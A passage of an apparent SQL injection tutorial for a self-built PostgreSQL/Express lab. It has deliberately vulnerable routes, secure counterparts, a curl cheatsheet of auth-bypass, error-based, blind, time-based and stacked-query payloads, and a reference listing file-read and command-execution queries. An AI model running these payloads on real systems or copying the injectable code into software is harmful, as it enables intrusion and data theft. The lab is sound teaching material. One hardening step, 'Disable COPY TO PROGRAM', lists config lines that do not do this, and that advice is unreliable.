    res.status(500).json({
      error: err.message, // ← Error message leaked to user!
      query_executed: query,
    })
  }
})

// VULNERABLE 2: Error Based Injection (product search)
// TEST:
//   Normal: GET /api/vuln/products?category=electronics
//   Attack (get version): ?category=' AND 1=CAST(version() AS INTEGER)--
//   Attack (get db name): ?category=' AND 1=CAST(current_database() AS INTEGER)--
//   Attack (get tables):  ?category=' AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1) AS INTEGER)--
//   Attack (get secrets): ?category=' AND 1=CAST((SELECT key_value FROM secrets LIMIT 1) AS INTEGER)--

app.get('/api/vuln/products', async (req, res) => {
  const { category } = req.query

  // ❌ VULNERABLE
  const query = `SELECT name, price, category FROM products WHERE category = '${category}'`

  console.log('\n[VULN PRODUCTS] Query:', query)

  try {
    const result = await pool.query(query)
    res.json({
      results: result.rows,
      query_executed: query,
    })
  } catch (err) {
    // ❌ PostgreSQL error message exposed!
    // Error-based injection extracts data from this error!
    res.status(500).json({
      error: err.message, // ← "invalid input syntax for type integer: 'admin:hash'"
      query_executed: query,
    })
  }
})

// VULNERABLE 3: Blind Boolean Injection (user lookup)
// TEST:
//   Normal: GET /api/vuln/user?id=1    → {"found":true,"user":{...}}
//   Normal: GET /api/vuln/user?id=999  → {"found":false}
//   Boolean TRUE:  ?id=1 AND 1=1--    → found:true
//   Boolean FALSE: ?id=1 AND 1=2--    → found:false
//   Extract db: ?id=1 AND SUBSTR(current_database(),1,1)='p'--  (p for pglab)

app.get('/api/vuln/user', async (req, res) => {
  const { id } = req.query

  // ❌ VULNERABLE: id directly in query
  const query = `SELECT id, username, email FROM users WHERE id = ${id}`

  console.log('\n[VULN USER] Query:', query)

  try {
    const result = await pool.query(query)
    if (result.rows.length > 0) {
      res.json({ found: true, user: result.rows[0] })
    } else {
      res.json({ found: false })
    }
  } catch (err) {
    res.status(500).json({ error: err.message })
  }
})

// VULNERABLE 4: Time Based Injection
// TEST:
//   Normal: GET /api/vuln/time?id=1   → fast response
//   Sleep:  ?id=1; SELECT pg_sleep(5)--  → 5 second delay!
//   Conditional: ?id=1 AND (SELECT CASE WHEN (current_database()='pglab') THEN pg_sleep(5) ELSE pg_sleep(0) END) IS NOT NULL--

app.get('/api/vuln/time', async (req, res) => {
  const { id } = req.query

  // ❌ VULNERABLE: pg_sleep can be injected
  const query = `SELECT id, username FROM users WHERE id = ${id} LIMIT 1`

  const start = Date.now()
  try {
    const result = await pool.query(query)
    const elapsed = Date.now() - start

    res.json({
      found: result.rows.length > 0,
      user: result.rows[0] || null,
      response_ms: elapsed,
      warning: elapsed > 3000 ? '⚠️ SLOW - Sleep injection detected!' : 'Normal',
    })
  } catch (err) {
    const elapsed = Date.now() - start
    res.status(500).json({ error: err.message, response_ms: elapsed })
  }
})

// VULNERABLE 5: Stacked Query (update operation)
// TEST:
//   Normal: PUT /api/vuln/update Body: {"id":1,"username":"newname"}
//   Stacked: Body: {"id":"1; CREATE TABLE hacked(data TEXT);--","username":"x"}
//   Stacked: Body: {"id":"1; INSERT INTO users VALUES(99,'hacker','h@h.com','pass','admin',NULL,0);--","username":"x"}

app.put('/api/vuln/update', async (req, res) => {
  const { id, username } = req.body

  // ❌ VULNERABLE: stacked query possible!
  const query = `UPDATE users SET username = '${username}' WHERE id = ${id}`

  console.log('\n[VULN UPDATE] Query:', query)

  try {
    const result = await pool.query(query)
    res.json({
      success: true,
      rows_affected: result.rowCount,
      query_executed: query,
    })
  } catch (err) {
    res.status(500).json({ error: err.message, query_executed: query })
  }
})

// ══════════════════════════════════════════════════════════════
// SECURE ROUTES
// ══════════════════════════════════════════════════════════════

// SECURE 1: Login (Parameterized)
app.post('/api/secure/login', async (req, res) => {
  const { username, password } = req.body

  // ✅ SAFE: $1, $2 are parameterized placeholders
  // PostgreSQL receives query structure and data SEPARATELY
  const query = 'SELECT id, username, email, role FROM users WHERE username = $1 AND password = $2'

  try {
    const result = await pool.query(query, [username, password])

    if (result.rows.length > 0) {
      res.json({ success: true, user: result.rows[0] })
    } else {
      // ✅ Generic error — don't reveal if user exists
      res.status(401).json({ success: false, message: 'Invalid credentials' })
    }
  } catch (err) {
    // ✅ Log internally, don't expose to user
    console.error('Login error:', err)
    res.status(500).json({ error: 'Login failed' })
  }
})

// SECURE 2: Products (Parameterized + Whitelist)
app.get('/api/secure/products', async (req, res) => {
  const { category } = req.query

  // ✅ Input validation: whitelist allowed categories
  const allowedCategories = ['electronics', 'furniture', 'clothing']
  if (category && !allowedCategories.includes(category)) {
    return res.status(400).json({ error: 'Invalid category' })
  }

  // ✅ Parameterized query
  const result = await pool.query(
    'SELECT name, price, category FROM products WHERE category = $1',
    [category],
  )
  res.json({ results: result.rows })
})

// SECURE 3: User by ID (Integer validation)
app.get('/api/secure/user', async (req, res) => {
  const rawId = req.query.id

  // ✅ Validate: must be a positive integer
  const id = parseInt(rawId, 10)
  if (isNaN(id) || id <= 0 || String(id) !== rawId) {
    return res.status(400).json({ error: 'Invalid user ID' })
  }

  const result = await pool.query('SELECT id, username, email FROM users WHERE id = $1', [id])

  if (result.rows.length > 0) {
    res.json({ user: result.rows[0] })
  } else {
    res.status(404).json({ error: 'Not found' })
  }
})

const PORT = process.env.PORT || 5000
app.listen(PORT, () => {
  console.log(`\n🐘 PostgreSQL Injection Lab running on http://localhost:${PORT}`)
  console.log('\nVulnerable endpoints:')
  console.log('  POST /api/vuln/login     ← Auth bypass')
  console.log('  GET  /api/vuln/products  ← Error based + UNION')
  console.log('  GET  /api/vuln/user      ← Blind boolean')
  console.log('  GET  /api/vuln/time      ← Time based (pg_sleep)')
  console.log('  PUT  /api/vuln/update    ← Stacked queries')
  console.log('\nSecure endpoints:')
  console.log('  POST /api/secure/login')
  console.log('  GET  /api/secure/products')
  console.log('  GET  /api/secure/user\n')
})
```

---

## 17. Testing Cheatsheet

### Complete curl Commands for Each Attack

```bash
# ════════════════════════════════════════════════
# 1. AUTHENTICATION BYPASS
# ════════════════════════════════════════════════

# Normal login:
curl -X POST http://localhost:5000/api/vuln/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}'

# Bypass with comment (login as alice without password):
curl -X POST http://localhost:5000/api/vuln/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice'\''--","password":"doesntmatter"}'

# Login as any first user:
curl -X POST http://localhost:5000/api/vuln/login \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"' OR '1'='1' LIMIT 1--\",\"password\":\"x\"}"

# ════════════════════════════════════════════════
# 2. ERROR BASED INJECTION
# ════════════════════════════════════════════════

# Get PostgreSQL version:
curl "http://localhost:5000/api/vuln/products?category=x' AND 1=CAST(version() AS INTEGER)--"

# Get database name:
curl "http://localhost:5000/api/vuln/products?category=x' AND 1=CAST(current_database() AS INTEGER)--"

# Get first table name:
curl "http://localhost:5000/api/vuln/products?category=x' AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1) AS INTEGER)--"

# Dump secrets table:
curl "http://localhost:5000/api/vuln/products?category=x' AND 1=CAST((SELECT key_value FROM secrets LIMIT 1) AS INTEGER)--"

# Dump all users as XML (one request!):
curl "http://localhost:5000/api/vuln/products?category=x' AND 1=CAST((SELECT query_to_xml('SELECT * FROM users',true,true,'')) AS INTEGER)--"

# ════════════════════════════════════════════════
# 3. BLIND BOOLEAN INJECTION
# ════════════════════════════════════════════════

# Confirm injection (should return found:true):
curl "http://localhost:5000/api/vuln/user?id=1 AND 1=1--"

# Should return found:false:
curl "http://localhost:5000/api/vuln/user?id=1 AND 1=2--"

# Is database name 'pglab'? (should be true):
curl "http://localhost:5000/api/vuln/user?id=1 AND current_database()='pglab'--"

# Is admin password longer than 5 chars?:
curl "http://localhost:5000/api/vuln/user?id=3 AND LENGTH(password)>5--"

# ════════════════════════════════════════════════
# 4. TIME BASED INJECTION
# ════════════════════════════════════════════════

# Sleep 5 seconds (confirm injection):
curl -w "\nTime: %{time_total}s\n" \
  "http://localhost:5000/api/vuln/time?id=1;SELECT%20pg_sleep(5)--"

# Conditional sleep (is database name 'pglab'?):
curl -w "\nTime: %{time_total}s\n" \
  "http://localhost:5000/api/vuln/time?id=1 AND (SELECT CASE WHEN current_database()='pglab' THEN pg_sleep(5) ELSE pg_sleep(0) END) IS NOT NULL--"

# ════════════════════════════════════════════════
# 5. STACKED QUERIES
# ════════════════════════════════════════════════

# Create a backdoor table:
curl -X PUT http://localhost:5000/api/vuln/update \
  -H "Content-Type: application/json" \
  -d '{"id":"1; CREATE TABLE backdoor(data TEXT)","username":"test"}'

# Insert admin user via stacked query:
curl -X PUT http://localhost:5000/api/vuln/update \
  -H "Content-Type: application/json" \
  -d "{\"id\":\"1; INSERT INTO users VALUES(99,'hacker','h@h.com','pass','admin',NULL,0)\",\"username\":\"x\"}"
```

---

## 18. Defense

### Parameterized Queries in PostgreSQL (Node.js)

```javascript
// ❌ NEVER — string concatenation:
const q = `SELECT * FROM users WHERE username = '${username}'`
pool.query(q)

// ✅ ALWAYS — parameterized with $1, $2:
pool.query('SELECT * FROM users WHERE username = $1', [username])
pool.query('SELECT * FROM users WHERE username = $1 AND password = $2', [username, password])

// ✅ For dynamic ORDER BY (can't parameterize column names):
const allowed = ['name', 'price', 'created_at']
const col = req.query.sort
if (!allowed.includes(col)) throw new Error('Invalid sort')
pool.query(`SELECT * FROM products ORDER BY ${col}`) // Safe because whitelisted!
```

### PostgreSQL-Specific Hardening

```sql
-- 1. Use a dedicated low-privilege user:
CREATE USER app_readonly WITH PASSWORD 'strongpass';
GRANT SELECT ON users, products TO app_readonly;
-- No INSERT, UPDATE, DELETE, DROP, COPY, CREATE!

-- 2. Disable superuser for app connection:
CREATE USER app_user WITH PASSWORD 'apppass' NOSUPERUSER NOCREATEDB NOCREATEROLE;

-- 3. Disable COPY TO PROGRAM (blocks RCE!):
-- In postgresql.conf:
-- log_temp_files = 0  (log all temp files)
-- shared_preload_libraries = 'pg_stat_statements'

-- 4. Restrict pg_read_file:
-- Only available to superuser — don't let app connect as superuser!

-- 5. Set search_path explicitly:
ALTER ROLE app_user SET search_path TO public;
-- Prevents schema injection attacks
```

### Error Hiding in Node.js

```javascript
// ❌ Exposes database internals:
app.use((err, req, res, next) => {
  res.status(500).json({ error: err.message }) // ← Shows SQL error!
})

// ✅ Generic error, internal logging:
app.use((err, req, res, next) => {
  console.error('[Internal Error]', {
    message: err.message,
    query: err.query, // pg error includes the query!
    timestamp: new Date(),
  })
  res.status(500).json({ error: 'Internal server error' }) // Generic!
})
```

---

## PostgreSQL Quick Reference

```sql
-- Version:          SELECT version();
-- Database:         SELECT current_database();
-- Schema:           SELECT current_schema();
-- Current user:     SELECT current_user;
-- Is superuser?:    SELECT current_setting('is_superuser');
-- List tables:      SELECT tablename FROM pg_tables WHERE schemaname='public';
-- List columns:     SELECT column_name FROM information_schema.columns WHERE table_name='x';
-- List users:       SELECT usename FROM pg_user;
-- User+hash:        SELECT usename,passwd FROM pg_shadow; (superuser only!)
-- Sleep:            SELECT pg_sleep(5);
-- Conditional sleep: SELECT CASE WHEN [cond] THEN pg_sleep(5) ELSE pg_sleep(0) END;
-- Cast error:       AND 1=CAST((SELECT version()) AS INTEGER)--
-- XML dump:         SELECT query_to_xml('SELECT * FROM users',true,true,'');
-- Read file:        SELECT pg_read_file('/etc/passwd',0,4096);
-- Write file:       COPY (SELECT 'text') TO '/tmp/file.txt';
-- Run command:      COPY x FROM PROGRAM 'whoami';
-- Dollar quote:     $$admin$$ instead of 'admin'
-- CHR():           CHR(97)||CHR(100)||CHR(109) = 'adm'
-- Substring:       SUBSTR(string, start, length)
```

---

## Next Steps

```
From PayloadsAllTheThings, next to study:
  1. MySQL Injection.md    ← Compare with PostgreSQL
  2. MSSQL Injection.md    ← Windows SQL Server (xp_cmdshell)
  3. NoSQL Injection       ← MongoDB (directly relevant to MERN!)
  4. XSS Injection         ← Client-side attacks

Practice Labs:
  PortSwigger PostgreSQL labs: portswigger.net/web-security/sql-injection
  HackTheBox: PostgreSQL machines
  Root Me: SQL injection challenges
```
